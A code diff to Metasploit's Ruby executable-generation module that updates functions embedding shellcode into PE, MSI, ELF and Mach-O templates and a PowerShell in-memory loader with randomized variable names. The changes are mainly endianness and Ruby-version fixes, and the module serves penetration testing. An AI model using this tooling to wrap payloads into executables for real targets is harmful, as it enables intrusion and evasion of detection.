@@ -325,22 +325,22 @@ require 'msf/core/exe/segment_injector'
 
     # look for section with entry point
     sections_header.each do |sec|
-      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('L')[0]
-      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('L')[0]
-      characteristics = sec[1][characteristics_offset,0x4].unpack('L')[0]
+      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('V')[0]
+      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('V')[0]
+      characteristics = sec[1][characteristics_offset,0x4].unpack('V')[0]
 
       if (virtualAddress...virtualAddress+sizeOfRawData).include?(addressOfEntryPoint)
-        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('L')[0]
+        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('V')[0]
         if (importsTable - addressOfEntryPoint) < code.length
           #shift original entry point to prevent tables overwritting
           addressOfEntryPoint = importsTable - code.length + 4
 
           entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
-          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('L')
+          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('V')
         end
         # put this section writable
         characteristics |= 0x8000_0000
-        newcharacteristics = [characteristics].pack('L')
+        newcharacteristics = [characteristics].pack('V')
         exe[sec[0],newcharacteristics.length] = newcharacteristics
       end
     end
@@ -633,12 +633,16 @@ require 'msf/core/exe/segment_injector'
 
     msi = self.get_file_contents(template)
 
-    section_size = 2**(msi[30..31].unpack('s').first)
-    sector_allocation_table = msi[section_size..section_size*2].unpack('l*')
+    section_size =	2**(msi[30..31].unpack('v')[0])
+
+    # This table is one of the few cases where signed values are needed
+    sector_allocation_table = msi[section_size..section_size*2].unpack('l<*')
 
     buffer_chain = []
-    current_secid = 5	# This is closely coupled with the template provided and
-          # ideally would be calculated from the dir stream?
+
+    # This is closely coupled with the template provided and ideally
+    # would be calculated from the dir stream?
+    current_secid = 5
 
     until current_secid == -2
       buffer_chain << current_secid
@@ -672,12 +676,12 @@ require 'msf/core/exe/segment_injector'
     set_template_default(opts, "template_armle_darwin.bin")
 
     mo = self.get_file_contents(opts[:template])
-    puts "mo is #{mo.class}:#{mo.to_s}:#{mo.length}"
+    puts "mo is #{mo.class}:len #{mo.length}"
     bo = self.find_payload_tag(mo, "Invalid OSX ArmLE Mach-O template: missing \"PAYLOAD:\" tag")
     puts "bo is #{bo.class}:#{bo.to_s}"
     mo[bo, code.length] = code
     puts "mo after is #{mo.class}:#{mo.to_s}:#{mo.length}"
-    mo
+    return mo
   end
 
   def self.to_osx_ppc_macho(framework, code, opts = {})
@@ -781,8 +785,8 @@ require 'msf/core/exe/segment_injector'
 
     # Check EI_CLASS to determine if the header is 32 or 64 bit
     # Use the proper offsets and pack size
-    case elf[4]
-    when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
+    case elf[4,1].unpack("C").first
+    when 1 # ELFCLASS32 - 32 bit (ruby 1.9+)
       if big_endian
         elf[0x44,4] = [elf.length].pack('N') #p_filesz
         elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
@@ -790,13 +794,13 @@ require 'msf/core/exe/segment_injector'
         elf[0x44,4] = [elf.length].pack('V') #p_filesz
         elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
       end
-    when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
+    when 2 # ELFCLASS64 - 64 bit (ruby 1.9+)
       if big_endian
         elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
         elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
       else # little endian
-        elf[0x60,8] = [elf.length].pack('Q') #p_filesz
-        elf[0x68,8] = [elf.length + code.length].pack('Q') #p_memsz
+        elf[0x60,8] = [elf.length].pack('Q<') #p_filesz
+        elf[0x68,8] = [elf.length + code.length].pack('Q<') #p_memsz
       end
     else
       raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
@@ -1027,18 +1031,19 @@ require 'msf/core/exe/segment_injector'
     read_replace_script_template("to_mem.aspx.template", hash_sub)
   end
 
-  def self.to_win32pe_psh_net(framework, code, opts = {})
-    hash_sub = {}
-    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_kernel32] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_baseaddr] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_threadHandle] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_output] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_temp] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_codeProvider] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_compileParams] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
+  def self.to_win32pe_psh_net(framework, code, opts={})
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:var_code)
+    rig.init_var(:var_kernel32)
+    rig.init_var(:var_baseaddr)
+    rig.init_var(:var_threadHandle)
+    rig.init_var(:var_output)
+    rig.init_var(:var_codeProvider)
+    rig.init_var(:var_compileParams)
+    rig.init_var(:var_syscode)
+    rig.init_var(:var_temp)
 
+    hash_sub = rig.to_h
     hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
 
     read_replace_script_template("to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
